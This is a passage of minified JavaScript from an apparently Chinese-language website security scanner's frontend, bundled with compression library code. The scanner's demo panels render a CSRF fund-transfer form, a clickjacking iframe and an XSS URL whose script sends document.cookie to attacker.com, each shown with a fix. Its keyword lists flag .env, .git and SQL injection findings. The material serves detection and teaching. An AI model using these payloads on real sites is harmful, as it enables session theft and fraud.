W=0;W|=1&w,w>>>=1,W<<=1,0<--C;);return W>>>1}function re(w,C,W){var Z,L,V=new Array(y+1),Q=0;for(Z=1;Z<=y;Z++)V[Z]=Q=Q+W[Z-1]<<1;for(L=0;L<=C;L++){var G=w[2*L+1];G!==0&&(w[2*L]=ge(V[G]++,G))}}function ae(w){var C;for(C=0;C<f;C++)w.dyn_ltree[2*C]=0;for(C=0;C<h;C++)w.dyn_dtree[2*C]=0;for(C=0;C<m;C++)w.bl_tree[2*C]=0;w.dyn_ltree[2*x]=1,w.opt_len=w.static_len=0,w.last_lit=w.matches=0}function oe(w){8<w.bi_valid?ee(w,w.bi_buf):0<w.bi_valid&&(w.pending_buf[w.pending++]=w.bi_buf),w.bi_buf=0,w.bi_valid=0}function ne(w,C,W,Z){var L=2*C,V=2*W;return w[L]<w[V]||w[L]===w[V]&&Z[C]<=Z[W]}function le(w,C,W){for(var Z=w.heap[W],L=W<<1;L<=w.heap_len&&(L<w.heap_len&&ne(C,w.heap[L+1],w.heap[L],w.depth)&&L++,!ne(C,Z,w.heap[L],w.depth));)w.heap[W]=w.heap[L],W=L,L<<=1;w.heap[W]=Z}function xe(w,C,W){var Z,L,V,Q,G=0;if(w.last_lit!==0)for(;Z=w.pending_buf[w.d_buf+2*G]<<8|w.pending_buf[w.d_buf+2*G+1],L=w.pending_buf[w.l_buf+G],G++,Z===0?X(w,L,C):(X(w,(V=l[L])+d+1,C),(Q=O[V])!==0&&K(w,L-=A[V],Q),X(w,V=T(--Z),W),(Q=j[V])!==0&&K(w,Z-=$[V],Q)),G<w.last_lit;);X(w,x,C)}function ze(w,C){var W,Z,L,V=C.dyn_tree,Q=C.stat_desc.static_tree,G=C.stat_desc.has_stree,se=C.stat_desc.elems,he=-1;for(w.heap_len=0,w.heap_max=g,W=0;W<se;W++)V[2*W]!==0?(w.heap[++w.heap_len]=he=W,w.depth[W]=0):V[2*W+1]=0;for(;w.heap_len<2;)V[2*(L=w.heap[++w.heap_len]=he<2?++he:0)]=1,w.depth[L]=0,w.opt_len--,G&&(w.static_len-=Q[2*L+1]);for(C.max_code=he,W=w.heap_len>>1;1<=W;W--)le(w,V,W);for(L=se;W=w.heap[1],w.heap[1]=w.heap[w.heap_len--],le(w,V,1),Z=w.heap[1],w.heap[--w.heap_max]=W,w.heap[--w.heap_max]=Z,V[2*L]=V[2*W]+V[2*Z],w.depth[L]=(w.depth[W]>=w.depth[Z]?w.depth[W]:w.depth[Z])+1,V[2*W+1]=V[2*Z+1]=L,w.heap[1]=L++,le(w,V,1),2<=w.heap_len;);w.heap[--w.heap_max]=w.heap[1],(function(ce,Ie){var ct,Pe,pt,me,St,Kt,Fe=Ie.dyn_tree,zi=Ie.max_code,qn=Ie.stat_desc.static_tree,$n=Ie.stat_desc.has_stree,Wn=Ie.stat_desc.extra_bits,Ii=Ie.stat_desc.extra_base,ut=Ie.stat_desc.max_length,Et=0;for(me=0;me<=y;me++)ce.bl_count[me]=0;for(Fe[2*ce.heap[ce.heap_max]+1]=0,ct=ce.heap_max+1;ct<g;ct++)ut<(me=Fe[2*Fe[2*(Pe=ce.heap[ct])+1]+1]+1)&&(me=ut,Et++),Fe[2*Pe+1]=me,zi<Pe||(ce.bl_count[me]++,St=0,Ii<=Pe&&(St=Wn[Pe-Ii]),Kt=Fe[2*Pe],ce.opt_len+=Kt*(me+St),$n&&(ce.static_len+=Kt*(qn[2*Pe+1]+St)));if(Et!==0){do{for(me=ut-1;ce.bl_count[me]===0;)me--;ce.bl_count[me]--,ce.bl_count[me+1]+=2,ce.bl_count[ut]--,Et-=2}while(0<Et);for(me=ut;me!==0;me--)for(Pe=ce.bl_count[me];Pe!==0;)zi<(pt=ce.heap[--ct])||(Fe[2*pt+1]!==me&&(ce.opt_len+=(me-Fe[2*pt+1])*Fe[2*pt],Fe[2*pt+1]=me),Pe--)}})(w,C),re(V,he,w.bl_count)}function u(w,C,W){var Z,L,V=-1,Q=C[1],G=0,se=7,he=4;for(Q===0&&(se=138,he=3),C[2*(W+1)+1]=65535,Z=0;Z<=W;Z++)L=Q,Q=C[2*(Z+1)+1],++G<se&&L===Q||(G<he?w.bl_tree[2*L]+=G:L!==0?(L!==V&&w.bl_tree[2*L]++,w.bl_tree[2*I]++):G<=10?w.bl_tree[2*z]++:w.bl_tree[2*R]++,V=L,he=(G=0)===Q?(se=138,3):L===Q?(se=6,3):(se=7,4))}function U(w,C,W){var Z,L,V=-1,Q=C[1],G=0,se=7,he=4;for(Q===0&&(se=138,he=3),Z=0;Z<=W;Z++)if(L=Q,Q=C[2*(Z+1)+1],!(++G<se&&L===Q)){if(G<he)for(;X(w,L,w.bl_tree),--G!=0;);else L!==0?(L!==V&&(X(w,L,w.bl_tree),G--),X(w,I,w.bl_tree),K(w,G-3,2)):G<=10?(X(w,z,w.bl_tree),K(w,G-3,3)):(X(w,R,w.bl_tree),K(w,G-11,7));V=L,he=(G=0)===Q?(se=138,3):L===Q?(se=6,3):(se=7,4)}}c($);var F=!1;function _(w,C,W,Z){K(w,(p<<1)+(Z?1:0),3),(function(L,V,Q,G){oe(L),ee(L,Q),ee(L,~Q),o.arraySet(L.pending_buf,L.window,V,Q,L.pending),L.pending+=Q})(w,C,W)}r._tr_init=function(w){F||((function(){var C,W,Z,L,V,Q=new Array(y+1);for(L=Z=0;L<v-1;L++)for(A[L]=Z,C=0;C<1<<O[L];C++)l[Z++]=L;for(l[Z-1]=L,L=V=0;L<16;L++)for($[L]=V,C=0;C<1<<j[L];C++)H[V++]=L;for(V>>=7;L<h;L++)for($[L]=V<<7,C=0;C<1<<j[L]-7;C++)H[256+V++]=L;for(W=0;W<=y;W++)Q[W]=0;for(C=0;C<=143;)Y[2*C+1]=8,C++,Q[8]++;for(;C<=255;)Y[2*C+1]=9,C++,Q[9]++;for(;C<=279;)Y[2*C+1]=7,C++,Q[7]++;for(;C<=287;)Y[2*C+1]=8,C++,Q[8]++;for(re(Y,f+1,Q),C=0;C<h;C++)S[2*C+1]=5,S[2*C]=ge(C,5);J=new te(Y,O,d+1,f,y),D=new te(S,j,0,h,y),q=new te(new Array(0),P,0,m,k)})(),F=!0),w.l_desc=new B(w.dyn_ltree,J),w.d_desc=new B(w.dyn_dtree,D),w.bl_desc=new B(w.bl_tree,q),w.bi_buf=0,w.bi_valid=0,ae(w)},r._tr_stored_block=_,r._tr_flush_block=function(w,C,W,Z){var L,V,Q=0;0<w.level?(w.strm.data_type===2&&(w.strm.data_type=(function(G){var se,he=4093624447;for(se=0;se<=31;se++,he>>>=1)if(1&he&&G.dyn_ltree[2*se]!==0)return a;if(G.dyn_ltree[18]!==0||G.dyn_ltree[20]!==0||G.dyn_ltree[26]!==0)return n;for(se=32;se<d;se++)if(G.dyn_ltree[2*se]!==0)return n;return a})(w)),ze(w,w.l_desc),ze(w,w.d_desc),Q=(function(G){var se;for(u(G,G.dyn_ltree,G.l_desc.max_code),u(G,G.dyn_dtree,G.d_desc.max_code),ze(G,G.bl_desc),se=m-1;3<=se&&G.bl_tree[2*N[se]+1]===0;se--);return G.opt_len+=3*(se+1)+5+5+4,se})(w),L=w.opt_len+3+7>>>3,(V=w.static_len+3+7>>>3)<=L&&(L=V)):L=V=W+5,W+4<=L&&C!==-1?_(w,C,W,Z):w.strategy===4||V===L?(K(w,2+(Z?1:0),3),xe(w,Y,S)):(K(w,4+(Z?1:0),3),(function(G,se,he,ce){var Ie;for(K(G,se-257,5),K(G,he-1,5),K(G,ce-4,4),Ie=0;Ie<ce;Ie++)K(G,G.bl_tree[2*N[Ie]+1],3);U(G,G.dyn_ltree,se-1),U(G,G.dyn_dtree,he-1)})(w,w.l_desc.max_code+1,w.d_desc.max_code+1,Q+1),xe(w,w.dyn_ltree,w.dyn_dtree)),ae(w),Z&&oe(w)},r._tr_tally=function(w,C,W){return w.pending_buf[w.d_buf+2*w.last_lit]=C>>>8&255,w.pending_buf[w.d_buf+2*w.last_lit+1]=255&C,w.pending_buf[w.l_buf+w.last_lit]=255&W,w.last_lit++,C===0?w.dyn_ltree[2*W]++:(w.matches++,C--,w.dyn_ltree[2*(l[W]+d+1)]++,w.dyn_dtree[2*T(C)]++),w.last_lit===w.lit_bufsize-1},r._tr_align=function(w){K(w,2,3),X(w,x,Y),(function(C){C.bi_valid===16?(ee(C,C.bi_buf),C.bi_buf=0,C.bi_valid=0):8<=C.bi_valid&&(C.pending_buf[C.pending++]=255&C.bi_buf,C.bi_buf>>=8,C.bi_valid-=8)})(w)}},{"../utils/common":41}],53:[function(t,s,r){s.exports=function(){this.input=null,this.next_in=0,this.avail_in=0,this.total_in=0,this.output=null,this.next_out=0,this.avail_out=0,this.total_out=0,this.msg="",this.state=null,this.data_type=2,this.adler=0}},{}],54:[function(t,s,r){(function(o){(function(a,n){if(!a.setImmediate){var c,p,v,d,f=1,h={},m=!1,g=a.document,y=Object.getPrototypeOf&&Object.getPrototypeOf(a);y=y&&y.setTimeout?y:a,c={}.toString.call(a.process)==="[object process]"?function(I){process.nextTick(function(){k(I)})}:(function(){if(a.postMessage&&!a.importScripts){var I=!0,z=a.onmessage;return a.onmessage=function(){I=!1},a.postMessage("","*"),a.onmessage=z,I}})()?(d="setImmediate$"+Math.random()+"$",a.addEventListener?a.addEventListener("message",x,!1):a.attachEvent("onmessage",x),function(I){a.postMessage(d+I,"*")}):a.MessageChannel?((v=new MessageChannel).port1.onmessage=function(I){k(I.data)},function(I){v.port2.postMessage(I)}):g&&"onreadystatechange"in g.createElement("script")?(p=g.documentElement,function(I){var z=g.createElement("script");z.onreadystatechange=function(){k(I),z.onreadystatechange=null,p.removeChild(z),z=null},p.appendChild(z)}):function(I){setTimeout(k,0,I)},y.setImmediate=function(I){typeof I!="function"&&(I=new Function(""+I));for(var z=new Array(arguments.length-1),R=0;R<z.length;R++)z[R]=arguments[R+1];var O={callback:I,args:z};return h[f]=O,c(f),f++},y.clearImmediate=b}function b(I){delete h[I]}function k(I){if(m)setTimeout(k,0,I);else{var z=h[I];if(z){m=!0;try{(function(R){var O=R.callback,j=R.args;switch(j.length){case 0:O();break;case 1:O(j[0]);break;case 2:O(j[0],j[1]);break;case 3:O(j[0],j[1],j[2]);break;default:O.apply(n,j)}})(z)}finally{b(I),m=!1}}}}function x(I){I.source===a&&typeof I.data=="string"&&I.data.indexOf(d)===0&&k(+I.data.slice(d.length))}})(typeof self>"u"?o===void 0?this:o:self)}).call(this,typeof It<"u"?It:typeof self<"u"?self:typeof window<"u"?window:{})},{}]},{},[10])(10)})})(Yt)),Yt.exports}var Lr=Br();const Or=Ar(Lr);function Mr(e){let i=document.getElementById("auth-guest"),t=document.getElementById("auth-register"),s=document.getElementById("auth-reset"),r=document.getElementById("auth-logged");i&&(i.style.display="block"),t&&(t.style.display="none"),s&&(s.style.display="none"),r&&(r.style.display="none")}function oi(e){if(e==null)return"--";let i=parseInt(e,10);return isNaN(i)?String(e):i.toLocaleString("zh-CN")}function Re(){return ve()?ir().then(function(e){let i=e&&e.success&&e.data&&typeof e.data.credits=="number"?e.data.credits:e&&typeof e.credits=="number"?e.credits:null;st("user-credits","额度："+oi(i));let t=document.getElementById("credits-balance");return t&&(t.textContent=oi(i)),i}).catch(function(){st("user-credits","额度：--")}):(st("user-credits","额度：--"),Promise.resolve(null))}function hi(e){e=parseInt(e,10)||1;let i=10,t=(e-1)*i,s=document.getElementById("credits-usage-list");s&&(s.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取使用记录...</div>'),Re(),nr(i,t).then(function(r){let o=r&&r.data&&r.data.logs||r&&r.logs||[],a=r&&r.data&&r.data.total||r&&r.total||o.length,n=r&&r.meta||{},c=n.limit||i,p=n.offset||t,v=Math.floor(p/c)+1,d=Math.max(1,Math.ceil(a/c));Pr(o),pi("credits-pagination",v,d,function(f){hi(f)}),Ne("credits-pagination",d>1?"flex":"none")}).catch(function(r){s&&(s.innerHTML='<div style="text-align:center;padding:20px;color:var(--danger)">读取使用记录失败</div>')})}function Pr(e){let i=document.getElementById("credits-usage-list");if(!i)return;if(!e||e.length===0){i.innerHTML='<div style="text-align:center;padding:24px;color:var(--text-secondary)">近 30 天内没有额度变动记录</div>';return}let t='<div style="display:flex;flex-direction:column;gap:8px">';e.forEach(function(s){let r=s.amount||0,o=r<0?"var(--danger)":"var(--success)",a=(r>0?"+":"")+r;t+='<div style="display:flex;align-items:center;justify-content:space-between;padding:10px;background:var(--bg);border:1px solid var(--border);border-radius:2px">',t+="<div>",t+='<div style="font-size:13px;font-weight:600">'+E(s.action||"额度变动")+"</div>",t+='<div style="font-size:11px;color:var(--text-secondary);margin-top:2px">'+Wt(s.created_at)+"</div>",t+="</div>",t+='<div style="text-align:right">',t+='<div style="font-size:13px;font-weight:700;color:'+o+'">'+a+"</div>",t+='<div style="font-size:11px;color:var(--text-secondary);margin-top:2px">余额 '+oi(s.balance_after)+"</div>",t+="</div></div>"}),t+="</div>",i.innerHTML=t}typeof window<"u"&&(window.doResetPassword=function(){let e=document.getElementById("reset-password-token"),i=document.getElementById("reset-new-password"),t=document.getElementById("reset-new-password2"),s=e?e.value.trim():"",r=i?i.value.trim():"",o=t?t.value.trim():"";if(!s){M("请输入重置 令牌");return}if(!r||r.length<6){M("新密码至少 6 个字符");return}if(r!==o){M("两次密码不一致");return}Ze("/api/auth/password-reset/confirm",{token:s,new_password:r}).then(function(a){a&&a.success?(M("密码重置成功，请重新登录"),Mr()):M(De(a)||"密码重置失败")}).catch(function(a){M("密码重置失败："+a.message)})},window.doResendVerification=function(){resendVerification().then(function(e){M(e&&e.message||"验证邮件已重新发送")}).catch(function(e){M("重新发送失败："+e.message)})},window.doVerifyEmailFromToken=function(){let e=document.getElementById("verify-email-token"),i=e?e.value.trim():"";if(!i){M("请输入邮箱验证 令牌");return}Ze("/api/auth/verify-email",{token:i}).then(function(t){t&&t.success?M("邮箱验证成功"):M(De(t)||"邮箱验证失败")}).catch(function(t){M("邮箱验证失败："+t.message)})});typeof window<"u"&&(window.refreshAuthChallenge=window.refreshAuthChallenge||function(){});const Qi=["源码","source map",".map","目录索引","目录遍历","路径遍历","敏感文件","泄露","注释","debug","backup","备份","phpinfo",".git",".env","source","map","index of","listing","xss","sql 注入","sqli","ssrf","open redirect","重定向","登录态","权限","csrf","idor","traversal","弱口令","防爆破","cookie","waf"],Rr=new Set(["path","url","snippet","body_hint","method","detected","header","value","reason","impact","limitation"]);function _e(e){return String(e||"").toLowerCase()}function en(e){return[e&&e.name,e&&e.title,e&&e.summary,e&&e.description,e&&e.type,e&&e.category,e&&e.evidence_text,e&&e.evidence_html,e&&e.evidence&&JSON.stringify(e.evidence)].filter(Boolean).join(" ")}function tn(e){if(!e||typeof e!="object")return!1;const i=e.evidence&&typeof e.evidence=="object"?e.evidence:null;return i?Object.keys(i).some(t=>Rr.has(t)&&i[t]!==void 0&&i[t]!==null&&String(i[t]).trim()!==""):!1}function nn(e){if(!e||typeof e!="object")return!1;const i=e.evidence&&typeof e.evidence=="object"?e.evidence:null;if(!i)return!1;const t=Object.values(i).filter(Boolean).map(s=>String(s).toLowerCase()).join(" ");return t?["sourcemappingurl","source map",".map",".env",".git",".svn",".bak","backup","dump","phpinfo","index of","directory listing","目录索引","敏感文件","源码泄露","注释","debug"].some(s=>t.includes(s)):!1}function Fr(e){if(!e||typeof e!="object")return"low";const i=_e(en(e)),t=e.evidence&&typeof e.evidence=="object"?e.evidence:null,s=_e(e.severity),r=nn(e),o=tn(e),a=Qi.some(n=>i.includes(n));return r?"high":o&&a||(s==="high"||s==="critical")&&a?"medium":t&&(_e(t.path).includes(".env")||_e(t.path).includes(".git")||_e(t.path).includes(".map")||_e(t.url).includes(".env")||_e(t.url).includes(".git")||_e(t.url).includes(".map"))?"high":(a&&(i.includes("source")||i.includes("泄露")||i.includes("敏感")),"low")}function jr(e){if(!e||typeof e!="object")return!1;const i=_e(en(e)),t=e.evidence&&typeof e.evidence=="object"?e.evidence:null,s=_e(e.type)||_e(e.category),r=Qi.some(n=>i.includes(n)),o=tn(e);return!!(nn(e)||o&&r||(s==="exposed"||s==="exposure"||s==="sensitive"||s==="leak")&&(r||t)||(_e(e.name).includes("源码")||_e(e.name).includes("敏感文件")||_e(e.name).includes("源码泄露"))&&o)}function Hr(e){return(Array.isArray(e)?e:[]).filter(jr).map(i=>({...i,confidence:Fr(i)})).sort((i,t)=>{const s={high:3,medium:2,low:1},r=(s[t.confidence]||0)-(s[i.confidence]||0);if(r!==0)return r;const o={critical:4,high:3,medium:2,low:1,info:0};return(o[t.severity]||0)-(o[i.severity]||0)})}function Nr(e){const i={high:0,medium:0,low:0};return(Array.isArray(e)?e:[]).forEach(t=>{const s=String(t&&t.confidence||"low").toLowerCase();i[s]!==void 0&&(i[s]+=1)}),i}function Oi(){return["源码映射文件","目录索引与备份文件","HTML 注释与调试信息","敏感配置与暴露路径","登录态与权限控制","重定向与路径校验","弱口令与防爆破","XSS / SQL 注入 / SSRF 线索","基础安全响应头"]}function Se(...e){return window.navigateTo(...e)}let de=null,Ue=null,rn="nginx",ye=!1,Xt=1,Qt=5,vt="",Dt="",Te=!1,nt=null,je=null,Oe=null,Ae=[],Ce=0,Tt=0,Mi=["正在初始化扫描引擎...","DNS 域名解析中...","建立 TCP 连接...","发送 HTTP 请求...","检查响应头安全配置...","检查 HSTS 配置...","检查 CSP 内容安全策略...","检查 X-Frame-Options...","检查 X-Content-Type-Options...","检查 Referrer-Policy...","检查 Permissions-Policy...","检测 SSL/TLS 证书...","验证证书链完整性...","检查证书有效期...","扫描敏感路径...","识别登录态与重定向风险...","检查 XSS 反射与存储特征...","检查 SQL 注入错误回显...","检查 SSRF / 路径穿越线索...","检查弱口令与限流策略...","检测 /.env 文件...","检测 /.git 目录...","检测 /admin 后台...","检测 /phpinfo.php...","检测 /.DS_Store...","识别 WAF 防火墙...","检测 Cloudflare...","检测 Nginx WAF...","检测 ModSecurity...","检查 CORS 跨域配置...","检测 Cookie 安全标志...","检查服务器信息泄露...","计算安全评分...","生成建议...","生成安全报告..."],at=!1,Be=[];function sn(e){let i=document.getElementById("radar-chart-container");if(!i)return;let t=[{name:"加密传输",key:"https",score:0},{name:"安全响应头",key:"headers",score:0},{name:"信息隐藏",key:"info",score:0},{name:"Cookie安全",key:"cookie",score:0},{name:"访问控制",key:"cors",score:0}],s=e.is_https||!1,r=e.findings||[];t[0].score=s?20:0;let o=r.filter(function(m){return m.name.indexOf("缺少")===0&&m.severity==="high"}).length;t[1].score=Math.max(0,20-o*3);let a=r.some(function(m){return m.name.indexOf("信息泄露")>=0});t[2].score=a?10:20;let n=r.some(function(m){return m.name.indexOf("Cookie")>=0});t[3].score=n?10:20;let c=r.some(function(m){return m.name.indexOf("CORS")>=0});t[4].score=c?10:20;let p=150,v=150,d=110,f='<svg width="300" height="300" viewBox="0 0 300 300" style="display:block;max-width:100%">';for(let m=1;m<=5;m++){let g=d*m/5,y=[];for(let b=0;b<5;b++){let k=Math.PI*2*b/5-Math.PI/2;y.push(p+g*Math.cos(k)+","+(v+g*Math.sin(k)))}f+='<polygon points="'+y.join(" ")+'" fill="none" stroke="rgba(75,110,175,0.15)" stroke-width="1"/>'}for(let m=0;m<5;m++){let g=Math.PI*2*m/5-Math.PI/2,y=p+d*Math.cos(g),b=v+d*Math.sin(g);f+='<line x1="'+p+'" y1="'+v+'" x2="'+y+'" y2="'+b+'" stroke="rgba(75,110,175,0.2)" stroke-width="1"/>'}let h=[];for(let m=0;m<5;m++){let g=Math.PI*2*m/5-Math.PI/2,y=d*t[m].score/20;h.push(p+y*Math.cos(g)+","+(v+y*Math.sin(g)))}f+='<defs><radialGradient id="radarGrad"><stop offset="0%" stop-color="rgba(75,110,175,0.6)"/><stop offset="100%" stop-color="rgba(168,85,247,0.4)"/></radialGradient></defs>',f+='<polygon points="'+h.join(" ")+'" fill="url(#radarGrad)" stroke="#4b6eaf" stroke-width="2" style="filter:drop-shadow(0 0 8px rgba(75,110,175,0.5));transition:all 1s ease-out">',f+='<animate attributeName="opacity" from="0" to="1" dur="1s" fill="freeze"/>',f+="</polygon>";for(let m=0;m<5;m++){let g=Math.PI*2*m/5-Math.PI/2,y=d*t[m].score/20,b=p+y*Math.cos(g),k=v+y*Math.sin(g);f+='<circle cx="'+b+'" cy="'+k+'" r="4" fill="#4b6eaf" stroke="#bbbbbb" stroke-width="2"/>'}for(let m=0;m<5;m++){let g=Math.PI*2*m/5-Math.PI/2,y=p+(d+25)*Math.cos(g),b=v+(d+25)*Math.sin(g),k=Math.abs(Math.cos(g))<.2?"middle":Math.cos(g)>0?"start":"end";f+='<text x="'+y+'" y="'+b+'" text-anchor="'+k+'" font-size="12" font-weight="600" fill="var(--text-primary)" dominant-baseline="middle">'+t[m].name+"</text>",f+='<text x="'+y+'" y="'+(b+14)+'" text-anchor="'+k+'" font-size="11" font-weight="700" fill="#4b6eaf" dominant-baseline="middle">'+t[m].score+"/20</text>"}f+="</svg>",i.innerHTML=f}function Dr(e){let i=document.getElementById("attack-演示-result");i&&(i.innerHTML='<div style="background:#3c3f41;border:1px solid rgba(199,84,80,0.3);border-radius:2px;padding:14px;animation:fadeInUp 0.4s"><div style="display:flex;align-items:center;gap:8px;margin-bottom:10px"><span style="background:#dc2626;color:#fff;padding:3px 8px;border-radius:2px;font-size:11px;font-weight:700">攻击中</span><span style="font-weight:600;font-size:13px">CSRF 跨站请求伪造</span></div><div style="background:#1f2937;color:#73c990;padding:10px;border-radius:2px;font-family:monospace;font-size:12px;line-height:1.6;margin-bottom:10px"><div>// 攻击者构造的恶意页面</div><div>&lt;form action="'+E(e)+'/api/transfer" method="POST"&gt;</div><div>&nbsp;&nbsp;&lt;input name="to" value="attacker"&gt;</div><div>&nbsp;&nbsp;&lt;input name="amount" value="10000"&gt;</div><div>&lt;/form&gt;</div><div>&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</div></div><div style="background:rgba(199,84,80,0.1);border-left:3px solid #c75450;padding:8px 10px;font-size:12px;color:#c75450;border-radius:2px;margin-bottom:10px"><strong>如果目标未设置 CSRF 令牌，受害者点击后资金会被转走。</strong></div><div style="background:rgba(115,201,144,0.1);border-left:3px solid #73c990;padding:8px 10px;font-size:12px;color:#73c990;border-radius:2px"><strong>修复：</strong>添加 <code style="background:#3c3f41;padding:1px 4px;border-radius:3px">SameSite=Strict</code> Cookie + CSRF 令牌 验证</div></div>')}function Ur(e){let i=document.getElementById("attack-演示-result");i&&(i.innerHTML='<div style="background:#3c3f41;border:1px solid rgba(240,167,50,0.3);border-radius:2px;padding:14px;animation:fadeInUp 0.4s"><div style="display:flex;align-items:center;gap:8px;margin-bottom:10px"><span style="background:#ea580c;color:#fff;padding:3px 8px;border-radius:2px;font-size:11px;font-weight:700">攻击中</span><span style="font-weight:600;font-size:13px">XSS 反射型注入</span></div><div style="background:#1f2937;color:#73c990;padding:10px;border-radius:2px;font-family:monospace;font-size:12px;line-height:1.6;margin-bottom:10px"><div>// 攻击 URL</div><div>'+E(e)+`/search?q=&lt;script&gt;</div><div>&nbsp;&nbsp;fetch('//attacker.com/steal?c='+document.cookie)</div><div>&nbsp;&nbsp;&lt;/script&gt;</div><div>// 受害者的 Cookie 被发送到攻击者服务器</div></div><div style="background:rgba(240,167,50,0.1);border-left:3px solid #f0a732;padding:8px 10px;font-size:12px;color:#f0a732;border-radius:2px;margin-bottom:10px"><strong>如果目标没有 CSP 策略，恶意脚本会被浏览器执行。</strong></div><div style="background:rgba(115,201,144,0.1);border-left:3px solid #73c990;padding:8px 10px;font-size:12px;color:#73c990;border-radius:2px"><strong>修复：</strong>添加 <code style="background:#3c3f41;padding:1px 4px;border-radius:3px">Content-Security-Policy</code> 头 + 输入输出转义</div></div>`)}function qr(e){let i=document.getElementById("attack-演示-result");i&&(i.innerHTML='<div style="background:#3c3f41;border:1px solid rgba(168,85,247,0.3);border-radius:2px;padding:14px;animation:fadeInUp 0.4s"><div style="display:flex;align-items:center;gap:8px;margin-bottom:10px"><span style="background:#9333ea;color:#fff;padding:3px 8px;border-radius:2px;font-size:11px;font-weight:700">攻击中</span><span style="font-weight:600;font-size:13px">点击劫持</span></div><div style="background:#1f2937;color:#73c990;padding:10px;border-radius:2px;font-family:monospace;font-size:12px;line-height:1.6;margin-bottom:10px"><div>// 攻击者页面</div><div>&lt;iframe src="'+E(e)+'"</div><div>&nbsp;&nbsp;style="opacity:0.1;position:absolute;top:0;left:0;"&gt;</div><div>&lt;/iframe&gt;</div><div>&lt;button style="position:absolute;top:50px"&gt;点这里领奖&lt;/button&gt;</div></div><div style="background:rgba(168,85,247,0.1);border-left:3px solid #9333ea;padding:8px 10px;font-size:12px;color:#c084fc;border-radius:2px;margin-bottom:10px"><strong>用户以为点在"领奖"按钮，实际上在点击下层网站的"删除"按钮。</strong></div><div style="background:rgba(115,201,144,0.1);border-left:3px solid #73c990;padding:8px 10px;font-size:12px;color:#73c990;border-radius:2px"><strong>修复：</strong>添加 <code style="background:#3c3f41;padding:1px 4px;border-radius:3px">X-Frame-Options: DENY</code> 或 CSP frame-ancestors</div></div>')}function on(e){let i=document.querySelector(".score-ring .score-value");if(!i)return;e=parseInt(e,10),(isNaN(e)||e<0)&&(e=0),e>100&&(e=100),nt&&(clearInterval(nt),nt=null);let t=0,s=Math.max(1,Math.floor(e/50));nt=setInterval(function(){t+=s,t>=e&&(t=e,clearInterval(nt),nt=null),i.textContent=t},20)}function vi(){try{return(function(){try{return JSON.parse(localStorage.getItem("vs_monitors")||"[]")}catch{return[]}})()}catch{return[]}}function an(e){try{(function(){try{localStorage.setItem("vs_monitors",JSON.stringify(e))}catch{}})()}catch{}}function $r(){let e=document.getElementById("monitor-url-input"),i=document.getElementById("monitor-freq-select"),t=e.value.trim(),s=i.value;if(!t){M("请输入 URL");return}/^https?:\/\//i.test(t)||(t="http://"+t);let r=vi();if(r.some(function(n){return n.url===t})){M("该 URL 已在监控列表中");return}let a={url:t,freq:s,added_at:new Date().toISOString(),last_scan:"-",score:null};ue("/api/targets",{method:"POST",body:JSON.stringify({url:t,schedule:s})}).then(function(n){return n.json()}).then(function(n){n.id&&(a.id=n.id)}).catch(function(){}),r.push(a),an(r),e.value="",mi(),M("监控目标已添加")}function Wr(e){if(!confirm("确定要删除此监控目标吗？"))return;let i=vi(),t=i[e];t&&t.id&&ue("/api/targets/"+t.id,{method:"DELETE"}).catch(function(){}),i.splice(e,1),an(i),mi(),M("监控目标已删除")}function mi(){let e=document.getElementById("monitor-target-list");if(!e)return;let i=vi();if(i.length===0){e.innerHTML='<div class="monitor-empty">暂无监控目标，请添加需要定期扫描的网站</div>';return}let t={daily:"每天",weekly:"每周",none:"不扫描"},s="";i.forEach(function(r,o){let a=r.score!==null?r.score>=75?"var(--success)":r.score>=50?"var(--warning)":"var(--danger)":"var(--text-lighter)";s+='<div class="monitor-item">',s+='<div style="flex:1;min-width:0">',s+='<div class="monitor-item-url">'+E(r.url)+"</div>",s+='<div class="monitor-item-meta">'+t[r.freq]||r.freq+" &middot; 上次扫描: "+(r.last_scan||"-")+"</div>",s+="</div>",s+='<div class="monitor-item-score" style="color:'+a+'">'+(r.score!==null?r.score:"-")+"</div>",s+='<button class="monitor-item-del" onclick="removeMonitorTarget('+o+')"></button>',s+="</div>"}),e.innerHTML=s}function Zr(e){if(!de){M("暂无扫描结果");return}let i=e||"pdf",t=i==="html"?"HTML":"PDF",s=i==="html"?"html":"pdf";M("正在生成 "+t+" 报告，请稍候...");function r(a){let n="/api/report/"+encodeURIComponent(a)+"?format="+i,c=Xr(de.url,s);i==="html"?ue(n).then(function(p){if(!p.ok)throw new Error("报告生成失败（"+p.status+")");return p.text()}).then(function(p){let v=new Blob([p],{type:"text/html;charset=utf-8"}),d=URL.createObjectURL(v),f=document.createElement("a");f.href=d,f.download=c,document.body.appendChild(f),f.click(),document.body.removeChild(f),URL.revokeObjectURL(d),M("HTML 报告已下载："+c)}).catch(function(p){M("报告下载失败: "+p.message)}):ue(n).then(function(p){if(!p.ok)throw new Error("PDF 生成失败（"+p.status+")");return p.blob()}).then(function(p){let v=URL.createObjectURL(p),d=document.createElement("a");d.href=v,d.download=c,document.body.appendChild(d),d.click(),document.body.removeChild(d),URL.revokeObjectURL(v),M("PDF 报告已下载："+c)}).catch(function(p){M("PDF 下载失败: "+p.message)})}let o=de.scan_id;!o||isNaN(Number(o))?ue("/api/history?limit=1").then(function(a){return a.json()}).then(function(a){let n=(a.history||[])[0];n&&n.id?r(n.id):M("当前结果暂不支持下载")}).catch(function(a){M("获取扫描记录失败: "+a.message)}):r(o)}function Xr(e,i){return"security-report-"+((et(e||"report")||"report").replace(/[^a-zA-Z0-9._-]+/g,"-").replace(/^-+|-+$/g,"")||"report")+"."+i}function Vr(){let e=document.getElementById("report-dropdown");e&&(e.classList.toggle("show"),e.classList.contains("show")&&setTimeout(function(){document.addEventListener("click",ln)},0))}function ln(e){let i=document.querySelector(".report-download-dropdown"),t=document.getElementById("report-dropdown");i&&!i.contains(e.target)&&t&&(t.classList.remove("show"),document.removeEventListener("click",ln))}function Gr(){try{return localStorage.getItem("vs_home_onboarding_seen")!=="1"}catch{return!0}}function Jr(){try{localStorage.setItem("vs_home_onboarding_seen","1")}catch{}let e=document.getElementById("home-onboarding-banner");e&&(e.style.display="none")}function Kr(){let e=document.getElementById("home-onboarding-banner");e&&(Gr()?e.style.display="block":e.style.display="none")}function dn(){let e=document.getElementById("scan-credits-hint"),i=document.getElementById("scan-credits-value");if(!(!e||!i)){if(!ve()){e.style.display="none";return}e.style.display="block",ue("/api/me/credits").then(function(t){return t.json()}).then(function(t){let s=t&&t.data&&typeof t.data.credits=="number"?t.data.credits:t&&typeof 